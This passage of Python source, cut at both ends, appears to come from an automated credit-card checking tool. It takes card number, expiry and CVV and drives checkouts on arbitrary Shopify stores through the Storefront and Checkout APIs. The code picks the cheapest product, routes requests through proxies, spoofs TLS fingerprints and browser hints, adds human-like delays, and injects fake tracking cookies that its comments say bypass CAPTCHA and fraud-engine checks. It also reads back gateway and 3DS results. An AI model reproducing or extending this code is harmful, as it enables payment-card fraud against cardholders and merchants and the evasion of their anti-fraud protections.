    This is REQUIRED to avoid MERCHANDISE_SIGNATURE_MISMATCH after the first
    negotiate round. The server computes a digest from the merchandise data
    and returns it in sellerProposal. We must echo it back on subsequent calls.
    """
    spm = {
        'variantId': f'gid://shopify/ProductVariant/{variant_id}',
        'productIdV2': f'gid://shopify/Product/{product_id}',
        'price': {
            'value': {
                'amount': f'{float(price):.2f}',
                'currencyCode': currency,
            },
        },
        'title': title or 'Product',
        'requiresShipping': requires_shipping,
        'properties': [],
        'taxable': True,
        'giftCard': False,
    }
    # NOTE: 'digest' is NOT a valid field in SourceProvidedMerchandiseInput
    # The server returns digest in sellerProposal but does NOT accept it as input
    # Sending it causes INVALID_VARIABLE errors on the negotiate mutation
    # digest = intentionally omitted
    return spm


# =====================================================================
# HELPER: Build a MerchandiseLineInput
# =====================================================================
def _build_merchandise_line(variant_id, product_id, price, currency, title, requires_shipping, quantity=1, digest=None):
    """Build a single MerchandiseLineInput using productVariantReference (matches real browser).
    
    CRITICAL: The real browser uses 'productVariantReference', NOT 'sourceProvidedMerchandise'.
    Using sourceProvidedMerchandise causes MERCHANDISE_SIGNATURE_MISMATCH because the server
    cannot reconcile source-provided merchandise with its session-registered merchandise.
    
    The 'id' field uses 'ProductVariantMerchandise' (not 'ProductVariant') GID type.
    """
    return {
        'merchandise': {
            'productVariantReference': {
                'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                'properties': [],
                'sellingPlanId': None,
                'sellingPlanDigest': None,
            },
        },
        'quantity': {
            'items': {'value': quantity},
        },
        'expectedTotalPrice': {
            'value': {
                'amount': f'{float(price) * quantity:.2f}',
                'currencyCode': currency,
            },
        },
        'lineComponentsSource': None,
        'lineComponents': [],
    }


# =====================================================================
# HELPER: Build a DeliveryLineInput
# =====================================================================
def _build_delivery_line(currency, first_name, last_name, street, city, country_code, zone_code, postal_code, phone, shipping_handle='shipping', shipping_amount=None):
    """Build a single DeliveryLineInput with correct schema format.
    
    Key schema points:
    - targetMerchandiseLines uses {any: true}, NOT {lines: [{stableId: ...}]}
    - selectedDeliveryStrategy uses deliveryStrategyByHandle: {handle, customDeliveryRate}
    - destination uses streetAddress with address1/zoneCode/postalCode
    - deliveryMethodTypes is REQUIRED NON_NULL
    - expectedTotalPrice uses {any: true} when shipping_amount is unknown
    """
    # When we don't know the shipping cost, use {any: true} to accept any amount
    if shipping_amount is not None and shipping_amount != '0':
        expected_price = {
            'value': {
                'amount': shipping_amount,
                'currencyCode': currency,
            },
        }
    else:
        expected_price = {'any': True}

    return {
        'targetMerchandiseLines': {'any': True},
        'selectedDeliveryStrategy': {
            'deliveryStrategyByHandle': {
                'handle': shipping_handle or 'shipping',
                'customDeliveryRate': False,
            },
        },
        'destination': {
            'streetAddress': {
                'firstName': first_name,
                'lastName': last_name,
                'address1': street,
                'address2': '',
                'city': city,
                'countryCode': country_code,
                'zoneCode': zone_code,
                'postalCode': postal_code,
                'phone': phone,
            },
        },
        'expectedTotalPrice': expected_price,
        'deliveryMethodTypes': ['SHIPPING'],
    }


# =====================================================================
# HELPER: Build DeliveryTermsInput
# =====================================================================
def _build_delivery_terms(delivery_lines, no_delivery_required=None):
    """Build DeliveryTermsInput.
    
    noDeliveryRequired is REQUIRED NON_NULL:
    - When shipping IS required: pass []
    - When no shipping: pass list of MerchandiseLineTargetInput (e.g., [{stableId: "..."}])
    """
    return {
        'deliveryLines': delivery_lines,
        'noDeliveryRequired': no_delivery_required if no_delivery_required is not None else [],
        'useProgressiveRates': False,
        'supportsSplitShipping': True,
    }


# =====================================================================
# HELPER: Extract negotiation result data from API response
# =====================================================================
def _parse_negotiate_response(resp_json):
    """Parse a negotiate query response and extract key data.
    
    Returns dict with:
        result_type, queue_token, session_token,
        seller_proposal, buyer_proposal, errors,
        tax_amount, tax_total, delivery_resolved, shipping_strategies,
        payment_method_identifier, stable_ids, checkout_total, is_shipping_required
    """
    result = {
        'result_type': None,
        'queue_token': None,
        'session_token': None,
        'seller_proposal': None,
        'buyer_proposal': None,
        'errors': [],
        'tax_amount': '0',
        'tax_total': '0',
        'delivery_resolved': False,
        'shipping_strategies': [],
        'payment_method_identifier': None,
        'stable_ids': [],
        'checkout_total': '0',
        'checkout_total_currency': 'USD',
        'is_shipping_required': True,
        'delivery_task_id': None,
        'delivery_poll_delay': 500,
        # Server-confirmed merchandise details for MERCHANDISE_SIGNATURE_MISMATCH fix
        'seller_digest': None,
        'seller_variant_id': None,
        'seller_product_id': None,
        'seller_price': None,
        'seller_currency': None,
        'seller_title': None,
        'seller_requires_shipping': None,
        'seller_properties': None,
        'seller_taxable': None,
        'seller_gift_card': None,
        # Server-confirmed delivery lines for DELIVERY_DELIVERY_LINE_DETAIL_CHANGED fix
        'server_delivery_lines': [],
        # Gateway detection from payment terms
        'gateway_name': None,
        'gateway_type': None,
    }
    
    data = resp_json.get('data') or {}
    session = data.get('session') if data else None
    negotiate = session.get('negotiate') if session else None
    
    if not negotiate:
        return result
    
    # Extract errors
    neg_errors = negotiate.get('errors', [])
    if neg_errors:
        result['errors'] = neg_errors
    
    # Extract result
    neg_result = negotiate.get('result') or {}
    result_type = neg_result.get('__typename', '')
    result['result_type'] = result_type
    
    if result_type == 'NegotiationResultAvailable':
        result['queue_token'] = neg_result.get('queueToken')
        result['session_token'] = neg_result.get('sessionToken')
        
        seller = neg_result.get('sellerProposal') or {}
        buyer = neg_result.get('buyerProposal') or {}
        result['seller_proposal'] = seller
        result['buyer_proposal'] = buyer
        
        # Extract isShippingRequired
        result['is_shipping_required'] = seller.get('isShippingRequired', True)
        
        # Extract checkoutTotal from SELLER proposal
        checkout_total_obj = seller.get('checkoutTotal') or {}
        ct_amount, ct_currency = _extract_money(checkout_total_obj)
        if ct_amount and ct_amount != '0':
            result['checkout_total'] = ct_amount
            result['checkout_total_currency'] = ct_currency
        else:
            # Try buyer proposal checkoutTotal
            buyer_ct = buyer.get('checkoutTotal') or {}
            bct_amount, bct_currency = _extract_money(buyer_ct)
            if bct_amount and bct_amount != '0':
                result['checkout_total'] = bct_amount
                result['checkout_total_currency'] = bct_currency
        
        # Extract delivery from sellerProposal.delivery (union)
        delivery_obj = seller.get('delivery') or {}
        delivery_typename = delivery_obj.get('__typename', '')
        
        if delivery_typename == 'FilledDeliveryTerms':
            result['delivery_resolved'] = True
            delivery_lines = delivery_obj.get('deliveryLines', [])
            strategies = []
            # Store full server-confirmed delivery lines for DELIVERY_DELIVERY_LINE_DETAIL_CHANGED fix
            server_delivery_lines = []
            for dl in delivery_lines:
                methods = dl.get('deliveryMethodTypes', [])
                dl_stable_id = dl.get('stableId', '')
                
                # ─── selectedDeliveryStrategy (UNION) ───
                # Response types: CompleteDeliveryStrategy | CustomDeliveryStrategy |
                #   DeliveryStrategyMatcher | DeliveryStrategyReference
                # INPUT type: DeliveryStrategyInput with deliveryStrategyByHandle
                sel_strategy = dl.get('selectedDeliveryStrategy') or {}
                _strat_typename = sel_strategy.get('__typename', '') if sel_strategy else ''
                print(f'[DELIVERY_TYPES] Strategy typename={_strat_typename}', file=sys.stderr)
                
                # Extract handle from whichever union member returned it
                server_handle = ''
                server_strategy_code = ''
                server_strategy_amount = None
                server_strategy_currency = None
                
                if _strat_typename == 'CompleteDeliveryStrategy':
                    server_handle = sel_strategy.get('handle', '')
                    server_strategy_code = sel_strategy.get('code', '')
                    _amt_obj = sel_strategy.get('amount') or {}
                    _amt_typename = _amt_obj.get('__typename', '') if _amt_obj else ''
                    if _amt_typename == 'MoneyValueConstraint':
                        _v = _amt_obj.get('value') or {}
                        server_strategy_amount = _v.get('amount')
                        server_strategy_currency = _v.get('currencyCode')
                    elif _amt_typename == 'AnyConstraint':
                        pass  # any constraint — use {any:true}
                elif _strat_typename == 'CustomDeliveryStrategy':
                    server_strategy_code = sel_strategy.get('code', '')
                    _price_obj = sel_strategy.get('price') or {}
                    _price_typename = _price_obj.get('__typename', '') if _price_obj else ''
                    if _price_typename == 'MoneyValueConstraint':
                        _v = _price_obj.get('value') or {}
                        server_strategy_amount = _v.get('amount')
                        server_strategy_currency = _v.get('currencyCode')
                elif _strat_typename == 'DeliveryStrategyReference':
                    server_handle = sel_strategy.get('handle', '')
                
                # ─── totalAmount (MoneyConstraint UNION) ───
                # Response: AnyConstraint | MoneyValueConstraint | MoneyIntervalConstraint
                # INPUT: expectedTotalPrice: MoneyConstraintInput
                server_total_amount_obj = dl.get('totalAmount') or {}
                server_total_amount, server_total_currency = _extract_money(server_total_amount_obj)
                _total_typename = server_total_amount_obj.get('__typename', '') if server_total_amount_obj else ''
                
                # ─── destinationAddress (DeliveryAddress UNION) ───
                # Response: StreetAddress | PartialStreetAddress | Geolocation | InvalidDeliveryAddress
                # INPUT: destination: DeliveryAddressInput with streetAddress
                server_dest_addr = dl.get('destinationAddress') or {}
                _dest_typename = server_dest_addr.get('__typename', '') if server_dest_addr else ''
                
                # Extract address fields from StreetAddress or PartialStreetAddress
                server_street1 = server_dest_addr.get('address1') or ''
                server_street2 = server_dest_addr.get('address2') or ''
                server_city = server_dest_addr.get('city') or ''
                server_country = server_dest_addr.get('countryCode') or ''
                server_zone = server_dest_addr.get('zoneCode') or ''
                server_postal = server_dest_addr.get('postalCode') or ''
                
                # ─── targetMerchandise (MerchandiseLineTargetCollection UNION) ───
                # Response: AnyMerchandiseLineTargetCollection | FilledMerchandiseLineTargetCollection
                # INPUT: targetMerchandiseLines: MerchandiseLineTargetCollectionInput
                server_target_merch = dl.get('targetMerchandise') or {}
                _target_typename = server_target_merch.get('__typename', '') if server_target_merch else ''
                
                print(f'[DELIVERY_LINE] stableId={dl_stable_id} handle={server_handle} code={server_strategy_code} '
                      f'strat_type={_strat_typename} total={server_total_amount} {server_total_currency} '
                      f'dest_type={_dest_typename} target_type={_target_typename}', file=sys.stderr)
                
                # Build a complete strategy entry with server-confirmed data
                dl_strategy = {
                    'code': server_strategy_code or (methods[0] if methods else 'SHIPPING'),
                    'handle': server_handle or 'shipping',
                    'breakdown': [],
                    'name': server_strategy_code or (methods[0] if methods else 'SHIPPING'),
                    'server_price': server_strategy_amount or server_total_amount,
                    'server_price_currency': server_strategy_currency or server_total_currency,
                    'server_custom_rate': False,
                }
                strategies.append(dl_strategy)
                
                # ─── Build the server-confirmed delivery line in DeliveryLineInput format ───
                # INPUT fields: deliveryMethodTypes, selectedDeliveryStrategy, targetMerchandiseLines,
                #   destination, expectedTotalPrice, destinationChanged, shopId
                server_dl = {
                    'deliveryMethodTypes': methods or ['SHIPPING'],
                    'selectedDeliveryStrategy': {
                        'deliveryStrategyByHandle': {
                            'handle': server_handle or 'shipping',
                            'customDeliveryRate': False,
                        },
                    },
                }
                
                # Build expectedTotalPrice from totalAmount
                if _total_typename == 'AnyConstraint' or (server_total_amount_obj and server_total_amount_obj.get('any')):
                    server_dl['expectedTotalPrice'] = {'any': True}
                elif server_total_amount and server_total_amount != '0':
                    server_dl['expectedTotalPrice'] = {
                        'value': {
                            'amount': server_total_amount,
                            'currencyCode': server_total_currency or 'USD',
                        },
                    }
                else:
                    server_dl['expectedTotalPrice'] = {'any': True}
                
                # Build targetMerchandiseLines from targetMerchandise
                if _target_typename == 'AnyMerchandiseLineTargetCollection' or (server_target_merch and server_target_merch.get('any')):
                    server_dl['targetMerchandiseLines'] = {'any': True}
                elif _target_typename == 'FilledMerchandiseLineTargetCollection':
                    # ALWAYS use {any: True} — stableIds from negotiate responses are only
                    # valid for the NEXT negotiate. Passing them in submit triggers
                    # INVALID_STABLE_ID because stableIds rotate after every negotiate step.
                    server_dl['targetMerchandiseLines'] = {'any': True}
                else:
                    server_dl['targetMerchandiseLines'] = {'any': True}
                
                # Build destination from destinationAddress
                if server_street1 or server_city:
                    server_dl['destination'] = {
                        'streetAddress': {
                            'firstName': '',
                            'lastName': '',
                            'address1': server_street1,
                            'address2': server_street2,
                            'city': server_city,
                            'countryCode': server_country,
                            'zoneCode': server_zone,
                            'postalCode': server_postal,
                            'phone': '',
                        },
                    }
                # NOTE: destination will be injected later in submit step if missing
                
                server_delivery_lines.append(server_dl)
                
                # If we have deliveryMethodTypes, create strategy entries (legacy compat)
                if methods:
                    for m in methods[1:]:  # Already added first method above
                        strategies.append({
                            'code': m,
                            'handle': server_handle or 'shipping',
                            'breakdown': [],
                            'name': m,
                            'server_price': server_strategy_amount or server_total_amount,
                            'server_price_currency': server_strategy_currency or server_total_currency,
                        })
            
            result['shipping_strategies'] = strategies
            result['server_delivery_lines'] = server_delivery_lines
        
        elif delivery_typename == 'PendingTerms':
            result['delivery_resolved'] = False
            result['delivery_task_id'] = delivery_obj.get('taskId')
            result['delivery_poll_delay'] = delivery_obj.get('pollDelay', 500)
        
        # Extract paymentMethodIdentifier from sellerProposal.payment
        payment_obj = seller.get('payment') or {}
        payment_typename = payment_obj.get('__typename', '')
        
        if payment_typename == 'FilledPaymentTerms':
            avail_lines = payment_obj.get('availablePaymentLines', [])
            for apl in avail_lines:
                pm = apl.get('paymentMethod') or {}
                pmi = pm.get('paymentMethodIdentifier', '')
                pm_name = pm.get('name', '')
                pm_typename = pm.get('__typename', '')
                # Detect gateway from payment method name
                _gw = _detect_gateway_from_payment(pm_name, pm_typename)
                if _gw and not result['gateway_name']:
                    result['gateway_name'] = _gw
                # Prefer shopify_payments
                if pm_name == 'shopify_payments' and pmi:
                    result['payment_method_identifier'] = pmi
                    result['gateway_name'] = 'shopify_payments'
                    result['gateway_type'] = pm_typename
                    break
                # Fallback: first non-wallet, non-giftcard payment
                if pmi and not result['payment_method_identifier']:
                    if pm_name not in ('SHOP_PAY', 'APPLE_PAY', 'GOOGLE_PAY', 'PAYPAL_EXPRESS', 'SHOPIFY_INSTALLMENTS'):
                        result['payment_method_identifier'] = pmi
                        if not result['gateway_name']:
                            result['gateway_name'] = _gw or pm_name
                            result['gateway_type'] = pm_typename
        
        # Extract stableIds from sellerProposal.merchandise
        # Also extract server-confirmed merchandise details (variantId, price, etc.)
        # so we can avoid MERCHANDISE_SIGNATURE_MISMATCH.
        merch_obj = seller.get('merchandise') or {}
        merch_typename = merch_obj.get('__typename', '')
        
        if merch_typename == 'FilledMerchandiseTerms':
            merch_lines = merch_obj.get('merchandiseLines', [])
            result['stable_ids'] = [ml.get('stableId', '') for ml in merch_lines if ml.get('stableId')]
            
            # Extract server-confirmed merchandise details from the first line.
            # The server echoes back what it considers the correct merchandise.
            # This is the authoritative source of truth for variantId, price, title, etc.
            if merch_lines:
                first_merch_line = merch_lines[0]
                merch_detail = first_merch_line.get('merchandise') or {}
                merch_detail_typename = merch_detail.get('__typename', '')
                
                if merch_detail_typename in (
                        'SourceProvidedMerchandise',
                        'ProductVariantMerchandise',
                        'ContextualizedProductVariantMerchandise',
                    ):
                    # Server confirmed merchandise — capture all useful fields.
                    # ProductVariantMerchandise uses `variantId` (gid:// ID directly).
                    # ContextualizedProductVariantMerchandise has variantId + price.
                    # SourceProvidedMerchandise has full detail incl. requiresShipping.
                    result['seller_variant_id'] = merch_detail.get('variantId', '')
                    _prod_obj = merch_detail.get('product') or {}
                    result['seller_product_id'] = (merch_detail.get('productIdV2', '')
                                                   or _prod_obj.get('id', ''))
                    _seller_price = merch_detail.get('price') or {}
                    if _seller_price:
                        result['seller_price'] = _seller_price.get('amount', '')
                        result['seller_currency'] = _seller_price.get('currencyCode', '')
                    result['seller_title'] = (merch_detail.get('title', '')
                                              or _prod_obj.get('title', ''))
                    result['seller_digest'] = merch_detail.get('digest', '')
                    result['seller_requires_shipping'] = merch_detail.get('requiresShipping', None)
                    result['seller_properties'] = merch_detail.get('properties', [])
                    result['seller_taxable'] = merch_detail.get('taxable', None)
                    result['seller_gift_card'] = merch_detail.get('giftCard', None)


    elif result_type == 'SubmittedForCompletion':
        receipt = neg_result.get('receipt') or {}
        if receipt and receipt.get('__typename') == 'FailedReceipt':
            pe = receipt.get('processingError') or {}
            _pe_type = pe.get('__typename', '') if pe else ''
            if _pe_type == 'InventoryClaimFailure':
                result['errors'] = [{'code': 'INVENTORY_CLAIM_FAILURE', 'localizedMessage': 'Item out of stock during payment'}]
            elif pe.get('hasOffsitePaymentMethod'):
                result['errors'] = [{'code': '3DS_REQUIRED', 'localizedMessage': 'Offsite payment method requires 3DS authentication'}]
            else:
                # processingError is a union, try to extract from dict
                result['errors'] = [{'code': pe.get('code', ''), 'localizedMessage': pe.get('localizedMessage', '')}]
    
    return result


# =====================================================================
# SITE-AGNOSTIC PRODUCT FETCHING
# =====================================================================
async def fetch_products(site_url, proxy_str=None):
    """Fetch cheapest available physical product from ANY Shopify store.
    
    Returns:
        (success, data_or_error_msg)
        On success, data = {'site': url, 'price': str, 'variant_id': str, 'product_id': str, 'title': str, 'link': str, 'requires_shipping': bool}
    """
    try:
        if not site_url.startswith('http'):
            site_url = "https://" + site_url

        proxy = _init_proxy(proxy_str)
        identifier = _pick_identifier()
        hints = _get_client_hints(identifier)
        session = AsyncClient(client_identifier=identifier, http2=True, verify=True, timeout=10)
        try:
            resp = await session.get(
                f"{site_url}/products.json",
                headers={'User-Agent': hints['ua']},
                proxy=proxy,
            )
            if resp.status_code != 200:
                return False, f"Site Error: HTTP {resp.status_code}"

            try:
                data = json.loads(resp.text)
                result = data.get('products', [])
            except (json.JSONDecodeError, Exception):
                return False, "Invalid products response"

            if not result:
                return False, "No products found"
        finally:
            await session.aclose()

        min_price = float('inf')
        min_product = None

        for product in result:
            if not product.get('variants'):
                continue
            product_numeric_id = product.get('id', '')
            product_title = product.get('title', 'Product')
            for variant in product['variants']:
                if not variant.get('available', True):
                    continue
                try:
                    price = variant.get('price', '0')
                    if isinstance(price, str):
                        if re.match(r'^\d+,\d{2}$', price.strip()):
                            price = float(price.replace(',', '.'))
                        else:
                            price = float(price.replace(',', ''))
                    else:
                        price = float(price)

                    if price <= 0:
                        continue

                    requires_shipping = variant.get('requires_shipping', True)
                    effective_price = price if requires_shipping else price + 10000

                    if effective_price < min_price:
                        min_price = effective_price
                        min_product = {
                            'site': site_url,
                            'price': f"{price:.2f}",
                            'variant_id': str(variant['id']),
                            'product_id': str(product_numeric_id),
                            'title': product_title,
                            'link': f"{site_url}/products/{product['handle']}",
                            'requires_shipping': requires_shipping,
                        }
                except (ValueError, TypeError, AttributeError):
                    continue

        if isinstance(min_product, dict) and min_product.get('variant_id'):
            return True, min_product
        else:
            return False, "No valid products available"

    except (tls_requests.TLSError, tls_requests.HTTPError, OSError) as e:
        return False, f"Proxy Error: {str(e)}"
    except Exception as e:
        return False, f"error: {str(e)}"


# =====================================================================
# CORE CHECKOUT FLOW — MULTI-SITE, SCHEMA-CORRECT v3
# =====================================================================
async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, shared_session=None):
    """Process a credit card checkout on ANY Shopify store.
    
    Uses the latest Shopify Checkout Web API (unstable) with Negotiation paradigm.
    All site-specific data (tokens, IDs, endpoints) are dynamically discovered.
    
    SCHEMA v3 FIXES:
    - MerchandiseInput uses sourceProvidedMerchandise (NOT stableId/productVariantReference)
    - DeliveryLineInput uses destination.streetAddress (NOT buyerIdentity.deliveryAddress)
    - DeliveryLineInput uses targetMerchandiseLines: {any: true}
    - DeliveryTermsInput.noDeliveryRequired is REQUIRED (pass [] when shipping)
    - DeliveryStreetAddressInput uses address1/zoneCode/postalCode
    - DeliveryStrategyInput uses deliveryStrategyByHandle: {handle, customDeliveryRate}
    - Payment is sent in a separate negotiate step (not bundled with merch+delivery)
    - Tax acceptance step added for TAX_NEW_TAX_MUST_BE_ACCEPTED
    
    Returns:
        tuple: (success: bool, message: str, gateway: str, total_price: str, currency: str)
    """
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"

    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
    parsed = urlparse(ourl)
    domain = parsed.netloc

    try:
        # --- TLS identifier + Client Hints + Proxy ---
        identifier = _pick_identifier()
        hints = _get_client_hints(identifier)
        proxy = _init_proxy(proxy_str)

        mobile = '?1' if any(x in hints['ua'] for x in ["Android", "iPhone", "iPad", "Mobile"]) else '?0'
        clienthint = 'Android' if 'Android' in hints['ua'] else ('macOS' if 'Macintosh' in hints['ua'] else 'Windows')

        # Sanitize variant_id
        if variant_id:
            _gid_match = re.match(r'^gid://shopify/ProductVariant/(\d+)$', str(variant_id))
            if _gid_match:
                variant_id = _gid_match.group(1)
            else:
                variant_id = str(variant_id).strip()

        # ======== STEP 1: FETCH PRODUCTS ========
        if not variant_id:
            info = await fetch_products(ourl, proxy_str)
            success, data = info
            if not success:
                return False, data, gateway, total_price, currency
            variant_id = data['variant_id']
            product_numeric_id = data.get('product_id', '')
            product_title = data.get('title', 'Product')
            price = float(data['price'])
            requires_shipping = data.get('requires_shipping', True)
        else:
            price = None
            requires_shipping = True
            product_numeric_id = ''
            product_title = 'Product'

        session = AsyncClient(
            client_identifier=identifier,
            http2=True,
            verify=not proxy,
            timeout=30,
        )

        try:
            # ======== STEP 1b: GET /products.json for product_id + price ========
            product_headers = {'User-Agent': hints['ua']}
            product_resp, _ = await retry_on_429(
                lambda: session.get(f"{ourl}/products.json", headers=product_headers, proxy=proxy, timeout=10, allow_redirects=True),
                step_name="products", max_retries=2, base_delay=3.0, max_delay=12.0
            )
            if product_resp.status_code != 200:
                return False, f"Products fetch failed: HTTP {product_resp.status_code}", gateway, total_price, currency

            try:
                products_data = json.loads(product_resp.text)
                products_list = products_data.get('products', [])
            except json.JSONDecodeError:
                return False, "Invalid products JSON", gateway, total_price, currency

            product_id_for_cart = None
            if price is None:
                min_price_val = float('inf')
                _best_id = _best_pid = _best_price = _best_rs = _best_title = None
                for product in products_list:
                    _pid = str(product.get('id', ''))
                    _ptitle = product.get('title', 'Product')
                    for variant in product.get('variants', []):
                        if not variant.get('available', True):
                            continue
                        try:
                            v_price = float(variant.get('price', '0'))
                            if v_price <= 0:
                                continue
                            if str(variant['id']) == str(variant_id):
                                product_id_for_cart = variant['id']
                                product_numeric_id = _pid
                                product_title = _ptitle
                                price = v_price
                                requires_shipping = variant.get('requires_shipping', True)
                                break
                            rs = variant.get('requires_shipping', True)
                            ep = v_price if rs else v_price + 10000
                            if ep < min_price_val:
                                min_price_val = ep
                                _best_id = variant['id']
                                _best_pid = _pid
                                _best_price = v_price
                                _best_rs = rs
                                _best_title = _ptitle
                        except (ValueError, TypeError):
                            continue
                    if product_id_for_cart:
                        break
                if not product_id_for_cart and _best_id:
                    product_id_for_cart = _best_id
                    product_numeric_id = _best_pid
                    price = _best_price
                    requires_shipping = _best_rs
                    product_title = _best_title
                elif not product_id_for_cart:
                    return False, "No valid products available", gateway, total_price, currency
            else:
                for product in products_list:
                    _pid = str(product.get('id', ''))
                    _ptitle = product.get('title', 'Product')
                    for variant in product.get('variants', []):
                        if str(variant['id']) == str(variant_id):
                            product_id_for_cart = variant['id']
                            product_numeric_id = _pid
                            product_title = _ptitle
                            requires_shipping = variant.get('requires_shipping', True)
                            break
                    if product_id_for_cart:
                        break
                if not product_id_for_cart:
                    product_id_for_cart = int(variant_id)

            # Ensure product_numeric_id is set
            if not product_numeric_id:
                product_numeric_id = str(product_id_for_cart)

            print(f'[STEP1] variant_id={variant_id} product_id={product_numeric_id} price={price} title={product_title[:30]}', file=sys.stderr)

            await human_delay(step_name="products")

            # ======== STEP 2: GET HOMEPAGE → extract Storefront accessToken ========
            # FIX: Use retry_on_429 for homepage request since the site may
            # rate-limit us after the products.json request in step 1b.
            # Also try extracting the token from the products.json response first.
            # CAPTCHA BYPASS: collect cookies from each response and pass them forward
            _session_cookies: dict = {}

            # Inject synthetic Shopify tracking cookies (normally set by browser JS)
            # Without these, Shopify's fraud/artifact engine returns REQUIRED_ARTIFACTS_UNAVAILABLE
            import uuid as _uuid_mod
            _session_cookies['_shopify_y'] = str(_uuid_mod.uuid4())
            _session_cookies['_shopify_s'] = ''.join(random.choices('0123456789abcdef', k=32))
            _session_cookies['_shopify_fs'] = f'{int(time.time())}.{random.randint(100000,999999)}'
            print(f'[COOKIES] Injected tracking cookies: _shopify_y, _shopify_s, _shopify_fs', file=sys.stderr)

            def _absorb_cookies(resp):
                try:
                    for k, v in resp.cookies.items():
                        if v:
                            _session_cookies[k] = v
                except Exception:
                    pass

            def _cookie_header() -> str:
                return '; '.join(f'{k}={v}' for k, v in _session_cookies.items() if v)

            site_key = None
            
            # Try extracting from products.json response first (some stores include it there)
            _prod_text = getattr(product_resp, 'text', '')
            if _prod_text:
                site_key = extract_storefront_token(_prod_text)
            
            if not site_key:
                # Try fetching the homepage with retry (stores may rate-limit)
                try:
                    home_resp, _ = await retry_on_429(
                        lambda: session.get(ourl, headers={
                            **product_headers,
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'sec-fetch-dest': 'document',
                            'sec-fetch-mode': 'navigate',
                            'sec-fetch-site': 'none',
                        }, proxy=proxy, allow_redirects=True, timeout=15),
                        step_name="homepage", max_retries=3, base_delay=5.0, max_delay=20.0
                    )
                    _home_status = home_resp.status_code
                    _home_text = home_resp.text
                    _absorb_cookies(home_resp)
                    print(f'[COOKIES] After homepage: {list(_session_cookies.keys())}', file=sys.stderr)
                    site_key = extract_storefront_token(_home_text)
                    if not site_key:
                        print(f'[STEP2] Token not found. Homepage status={_home_status} text_len={len(_home_text)}', file=sys.stderr)
                except Exception as _step2_err:
                    site_key = None
                    print(f'[STEP2] Homepage request failed: {type(_step2_err).__name__}: {_step2_err}', file=sys.stderr)
            
            # FIX: If homepage is rate-limited, try extracting token from a JS bundle URL
            # that many Shopify stores expose. Also try the /checkouts path.
            if not site_key:
                try:
                    # Try fetching a lightweight page that still has the token
                    _alt_resp = await session.get(
                        f'{ourl}/collections/all',
                        headers={**product_headers, 'Accept': 'text/html'},
                        proxy=proxy, allow_redirects=True, timeout=10,
                    )
                    if _alt_resp.status_code == 200:
                        site_key = extract_storefront_token(_alt_resp.text)
                except Exception:
                    pass

            if not site_key:
                return False, "Failed to extract Storefront API access token", gateway, total_price, currency

            print(f'[STEP2] site_key={site_key[:16]}... domain={domain}', file=sys.stderr)

            await human_delay(step_name="homepage")

            # ======== STEP 3: cartCreate (Storefront API) ========
            storefront_headers = {
                'accept': 'application/json',
                'content-type': 'application/json',
                'origin': ourl,
                'sec-ch-ua': hints['sec_ch_ua'],
                'sec-ch-ua-mobile': mobile,
                'sec-ch-ua-platform': f'"{clienthint}"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': hints['ua'],
                'x-sdk-variant': 'portable-wallets',
                'x-shopify-storefront-access-token': site_key,
                'x-start-wallet-checkout': 'true',
                'x-wallet-name': 'MoreOptions',
            }

            cart_create_data = {
                'query': MUTATION_CART_CREATE,
                'variables': {
                    'input': {
                        'lines': [
                            {
                                'merchandiseId': f'gid://shopify/ProductVariant/{product_id_for_cart}',
                                'quantity': 1,
                                'attributes': [],
                            },
                        ],
                        'discountCodes': [],
                    },
                },
                'operationName': 'cartCreate',
            }

            cart_create_resp, _ = await retry_on_429(
                lambda: session.post(
                    f'{ourl}/api/unstable/graphql.json',
                    params={'operation_name': 'cartCreate'},
                    headers=storefront_headers,
                    json=cart_create_data,
                    proxy=proxy, timeout=20, allow_redirects=True
                ),
                step_name="cart_create", max_retries=2, base_delay=3.0, max_delay=12.0
            )

            if cart_create_resp.status_code != 200:
                return False, f"CartCreate failed: HTTP {cart_create_resp.status_code}", gateway, total_price, currency

            try:
                cart_resp_data = json.loads(cart_create_resp.text)
                cart_result = cart_resp_data.get("data", {}).get("result", {})
                cart_obj = cart_result.get("cart")

                if cart_obj is None:
                    cart_errors = cart_result.get("errors", [])
                    if cart_errors:
                        err_msgs = [e.get("message", str(e)) for e in cart_errors[:3]]
                        return False, f"CartCreate error: {'; '.join(err_msgs)}", gateway, total_price, currency
                    top_errors = cart_resp_data.get("errors", [])
                    if top_errors:
                        err_msgs = [e.get("message", str(e)) for e in top_errors[:3]]
                        return False, f"CartCreate GraphQL error: {'; '.join(err_msgs)}", gateway, total_price, currency
                    return False, "CartCreate returned null cart (no errors)", gateway, total_price, currency

                checkout_url = cart_obj.get("checkoutUrl")
                if not checkout_url:
                    return False, "CartCreate returned no checkoutUrl", gateway, total_price, currency

                # ======== EXTRACT SERVER-CONFIRMED VARIANT GID FROM CART ========
                # CRITICAL FIX for MERCHANDISE_SIGNATURE_MISMATCH:
                # The cart response contains the server-confirmed variant GID
                # which may differ from what we constructed from REST API IDs.
                # We must use THIS GID for sourceProvidedMerchandise, not a
                # client-constructed one.  The Storefront API returns IDs in
                # base64-encoded format (e.g. "Z2lkOi8vc2hvcGlmeS9Qcm9kdWN0VmFyaWFudC8zOTU5NDY1OTUxMjQwMA==")
                # which decodes to "gid://shopify/ProductVariant/39594659512400".
                # The Checkout Web API (unstable) expects the gid:// format.
                cart_lines = cart_obj.get("lines", {}).get("edges", [])
                if cart_lines:
                    first_line = cart_lines[0].get("node", {})
                    merch = first_line.get("merchandise", {})
                    if merch and merch.get("id"):
                        # Storefront API returns base64-encoded GID
                        _raw_id = merch["id"]
                        # Decode if base64, otherwise use as-is
                        try:
                            import base64 as _b64
                            _decoded = _b64.b64decode(_raw_id).decode("utf-8")
                            if _decoded.startswith("gid://shopify/ProductVariant/"):
                                storefront_variant_gid = _decoded
                                storefront_variant_numeric = _decoded.split("/")[-1]
                            else:
                                storefront_variant_gid = _raw_id
                                storefront_variant_numeric = _raw_id
                        except Exception:
                            storefront_variant_gid = _raw_id
                            storefront_variant_numeric = _raw_id.split("/")[-1] if "/" in _raw_id else _raw_id

                        # Extract product GID
                        _product_data = merch.get("product", {})
                        if _product_data and _product_data.get("id"):
                            _raw_pid = _product_data["id"]
